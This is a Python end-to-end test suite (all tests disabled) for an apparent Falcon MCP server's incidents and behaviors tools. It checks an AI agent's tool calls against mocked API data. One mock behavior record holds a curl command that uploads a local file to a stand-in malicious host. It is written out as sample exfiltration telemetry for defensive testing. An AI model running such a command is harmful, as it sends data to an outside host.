"""
E2E tests for the Incidents module.
"""
import json
import unittest

import pytest

from tests.e2e.utils.base_e2e_test import BaseE2ETest


@pytest.mark.e2e
class TestIncidentsModuleE2E(BaseE2ETest):
    """
    End-to-end test suite for the Falcon MCP Server Incidents Module.
    """

    def xtest_crowd_score_default_parameters(self):
        """Verify the agent can retrieve CrowdScore with default parameters."""
        async def test_logic():
            fixtures = [
                {
                    "operation": "CrowdScore",
                    "validator": lambda kwargs: kwargs.get('parameters', {}).get('limit') == 100,
                    "response": {
                        "status_code": 200, 
                        "body": {
                            "resources": [
                                {"id": "score-1", "score": 50, "adjusted_score": 60},
                                {"id": "score-2", "score": 70, "adjusted_score": 80},
                                {"id": "score-3", "score": 40, "adjusted_score": 50}
                            ]
                        }
                    }
                }
            ]

            self._mock_api_instance.command.side_effect = self._create_mock_api_side_effect(fixtures)

            prompt = "What is our current CrowdScore?"
            return await self._run_agent_stream(prompt)

        def assertions(tools, result):
            self.assertGreaterEqual(len(tools), 1, "Expected at least 1 tool call")
            used_tool = tools[len(tools) - 1]
            self.assertEqual(used_tool['input']['tool_name'], "falcon_show_crowd_score")

            # Verify the output contains the expected data
            output = json.loads(used_tool['output'])
            self.assertEqual(output["average_score"], 53)  # (50+70+40)/3 = 53.33 rounded to 53
            self.assertEqual(output["average_adjusted_score"], 63)  # (60+80+50)/3 = 63.33 rounded to 63
            self.assertEqual(len(output["scores"]), 3)

            # Verify API call parameters
            self.assertGreaterEqual(self._mock_api_instance.command.call_count, 1, "Expected at least 1 API call")
            api_call_params = self._mock_api_instance.command.call_args_list[0][1].get('parameters', {})
            self.assertEqual(api_call_params.get('limit'), 100)  # Default limit
            self.assertEqual(api_call_params.get('offset'), 0)   # Default offset

            # Verify result contains CrowdScore information
            self.assertIn("CrowdScore", result)
            self.assertIn("53", result)  # Average score should be mentioned

        self.run_test_with_retries(
            "test_crowd_score_default_parameters",
            test_logic,
            assertions
        )

    def xtest_search_incidents_with_filter(self):
        """Verify the agent can search for incidents with a filter."""
        async def test_logic():
            fixtures = [
                {
                    "operation": "QueryIncidents",
                    "validator": lambda kwargs: "state:'open'" in kwargs.get('parameters', {}).get('filter', ''),
                    "response": {"status_code": 200, "body": {"resources": ["incident-1", "incident-2"]}}
                },
                {
                    "operation": "GetIncidents",
                    "validator": lambda kwargs: "incident-1" in kwargs.get('body', {}).get('ids', []),
                    "response": {
                        "status_code": 200,
                        "body": {
                            "resources": [
                                {
                                    "id": "incident-1",
                                    "name": "Test Incident 1",
                                    "description": "This is a test incident",
                                    "status": 20,  # New
                                    "state": "open",
                                    "final_score": 80,
                                    "start": "2023-01-01T00:00:00Z",
                                    "end": "2023-01-02T00:00:00Z"
                                },
                                {
                                    "id": "incident-2",
                                    "name": "Test Incident 2",
                                    "description": "This is another test incident",
                                    "status": 30,  # In Progress
                                    "state": "open",
                                    "final_score": 65,
                                    "start": "2023-01-03T00:00:00Z",
                                    "end": "2023-01-04T00:00:00Z"
                                }
                            ]
                        }
                    }
                }
            ]

            self._mock_api_instance.command.side_effect = self._create_mock_api_side_effect(fixtures)

            prompt = "Find all open incidents"
            return await self._run_agent_stream(prompt)

        def assertions(tools, result):
            self.assertGreaterEqual(len(tools), 1, "Expected at least 1 tool call")
            used_tool = tools[len(tools) - 1]
            self.assertEqual(used_tool['input']['tool_name'], "falcon_search_incidents")

            # Verify the tool input contains the filter
            tool_input = used_tool['input']['tool_input']
            self.assertIn("open", tool_input.get('filter', '').lower())

            # Verify API call parameters
            self.assertGreaterEqual(self._mock_api_instance.command.call_count, 2, "Expected at least 2 API calls")

            # Check QueryIncidents call
            api_call_1_params = self._mock_api_instance.command.call_args_list[0][1].get('parameters', {})
            self.assertIn("state:'open'", api_call_1_params.get('filter', ''))

            # Check GetIncidents call
            api_call_2_body = self._mock_api_instance.command.call_args_list[1][1].get('body', {})
            self.assertEqual(api_call_2_body.get('ids'), ["incident-1", "incident-2"])

            # Verify result contains incident information
            self.assertIn("incident-1", result)
            self.assertIn("Test Incident 1", result)
            self.assertIn("incident-2", result)
            self.assertIn("Test Incident 2", result)

        self.run_test_with_retries(
            "test_search_incidents_with_filter",
            test_logic,
            assertions
        )

    def xtest_get_incident_details(self):
        """Verify the agent can get details for specific incidents."""
        async def test_logic():
            fixtures = [
                {
                    "operation": "GetIncidents",
                    "validator": lambda kwargs: "incident-3" in kwargs.get('body', {}).get('ids', []),
                    "response": {
                        "status_code": 200,
                        "body": {
                            "resources": [
                                {
                                    "id": "incident-3",
                                    "name": "High Priority Incident",
                                    "description": "Critical security incident requiring immediate attention",
                                    "status": 30,  # In Progress
                                    "state": "open",
                                    "final_score": 95,
                                    "start": "2023-02-01T00:00:00Z",
                                    "end": "2023-02-02T00:00:00Z",
                                    "tags": ["Critical", "Security Breach"],
                                    "host_ids": ["host-1", "host-2"]
                                }
                            ]
                        }
                    }
                }
            ]

            self._mock_api_instance.command.side_effect = self._create_mock_api_side_effect(fixtures)

            prompt = "Get details for incident with ID incident-3"
            return await self._run_agent_stream(prompt)

        def assertions(tools, result):
            self.assertGreaterEqual(len(tools), 1, "Expected at least 1 tool call")
            used_tool = tools[len(tools) - 1]
            self.assertEqual(used_tool['input']['tool_name'], "falcon_get_incident_details")

            # Verify the tool input contains the incident ID
            tool_input = json.loads(used_tool['input']['tool_input'])
            self.assertIn("incident-3", tool_input.get('ids', []))

            # Verify API call parameters
            self.assertGreaterEqual(self._mock_api_instance.command.call_count, 1, "Expected at least 1 API call")
            api_call_body = self._mock_api_instance.command.call_args_list[0][1].get('body', {})
            self.assertEqual(api_call_body.get('ids'), ["incident-3"])

            # Verify result contains incident information
            self.assertIn("incident-3", result)
            self.assertIn("High Priority Incident", result)
            self.assertIn("Critical security incident", result)
            self.assertIn("95", result)  # Score

        self.run_test_with_retries(
            "test_get_incident_details",
            test_logic,
            assertions
        )

    def xtest_search_behaviors(self):
        """Verify the agent can search for behaviors with a filter."""
        async def test_logic():
            fixtures = [
                {
                    "operation": "QueryBehaviors",
                    "validator": lambda kwargs: "severity:'critical'" in kwargs.get('parameters', {}).get('filter', ''),
                    "response": {"status_code": 200, "body": {"resources": ["behavior-1", "behavior-2"]}}
                },
                {
                    "operation": "GetBehaviors",
                    "validator": lambda kwargs: "behavior-1" in kwargs.get('body', {}).get('ids', []),
                    "response": {
                        "status_code": 200,
                        "body": {
                            "resources": [
                                {
                                    "id": "behavior-1",
                                    "scenario": "Suspicious Process Activity",
                                    "tactic": "Execution",
                                    "technique": "Command-Line Interface",
                                    "severity": "critical",
                                    "confidence": "high",
                                    "timestamp": "2023-01-15T12:30:00Z"
                                },
                                {
                                    "id": "behavior-2",
                                    "scenario": "Suspicious Network Connection",
                                    "tactic": "Command and Control",
                                    "technique": "Non-Standard Port",
                                    "severity": "critical",
                                    "confidence": "medium",
                                    "timestamp": "2023-01-15T13:45:00Z"
                                }
                            ]
                        }
                    }
                }
            ]

            self._mock_api_instance.command.side_effect = self._create_mock_api_side_effect(fixtures)

            prompt = "Find all critical severity behaviors"
            return await self._run_agent_stream(prompt)

        def assertions(tools, result):
            self.assertGreaterEqual(len(tools), 1, "Expected at least 1 tool call")
            used_tool = tools[len(tools) - 1]
            self.assertEqual(used_tool['input']['tool_name'], "falcon_search_behaviors")

            # Verify the tool input contains the filter
            tool_input = json.loads(used_tool['input']['tool_input'])
            self.assertIn("critical", tool_input.get('filter', '').lower())

            # Verify API call parameters
            self.assertGreaterEqual(self._mock_api_instance.command.call_count, 2, "Expected at least 2 API calls")

            # Check QueryBehaviors call
            api_call_1_params = self._mock_api_instance.command.call_args_list[0][1].get('parameters', {})
            self.assertIn("severity:'critical'", api_call_1_params.get('filter', ''))

            # Check GetBehaviors call
            api_call_2_body = self._mock_api_instance.command.call_args_list[1][1].get('body', {})
            self.assertEqual(api_call_2_body.get('ids'), ["behavior-1", "behavior-2"])

            # Verify result contains behavior information
            self.assertIn("behavior-1", result)
            self.assertIn("Suspicious Process Activity", result)
            self.assertIn("behavior-2", result)
            self.assertIn("Suspicious Network Connection", result)

        self.run_test_with_retries(
            "test_search_behaviors",
            test_logic,
            assertions
        )

    def xtest_get_behavior_details(self):
        """Verify the agent can get details for specific behaviors."""
        async def test_logic():
            fixtures = [
                {
                    "operation": "GetBehaviors",
                    "validator": lambda kwargs: "behavior-3" in kwargs.get('body', {}).get('ids', []),
                    "response": {
                        "status_code": 200,
                        "body": {
                            "resources": [
                                {
                                    "id": "behavior-3",
                                    "scenario": "Data Exfiltration Attempt",
                                    "tactic": "Exfiltration",
                                    "technique": "Data Transfer Size Limits",
                                    "severity": "high",
                                    "confidence": "high",
                                    "timestamp": "2023-03-10T08:15:00Z",
                                    "device_id": "device-123",
                                    "filename": "/tmp/suspicious.bin",
                                    "cmdline": "curl -X POST https://malicious-site.com/upload --data-binary @/tmp/sensitive.dat"
                                }
                            ]
                        }
                    }
                }
            ]

            self._mock_api_instance.command.side_effect = self._create_mock_api_side_effect(fixtures)

            prompt = "Get details for behavior with ID behavior-3"
            return await self._run_agent_stream(prompt)

        def assertions(tools, result):
            self.assertGreaterEqual(len(tools), 1, "Expected at least 1 tool call")
            used_tool = tools[len(tools) - 1]
            self.assertEqual(used_tool['input']['tool_name'], "falcon_get_behavior_details")

            # Verify the tool input contains the behavior ID
            tool_input = json.loads(used_tool['input']['tool_input'])
            self.assertIn("behavior-3", tool_input.get('ids', []))

            # Verify API call parameters
            self.assertGreaterEqual(self._mock_api_instance.command.call_count, 1, "Expected at least 1 API call")
            api_call_body = self._mock_api_instance.command.call_args_list[0][1].get('body', {})
            self.assertEqual(api_call_body.get('ids'), ["behavior-3"])

            # Verify result contains behavior information
            self.assertIn("behavior-3", result)
            self.assertIn("Data Exfiltration Attempt", result)
            self.assertIn("Exfiltration", result)
            self.assertIn("high", result.lower())  # Severity

        self.run_test_with_retries(
            "test_get_behavior_details",
            test_logic,
            assertions
        )


if __name__ == '__main__':
    unittest.main()
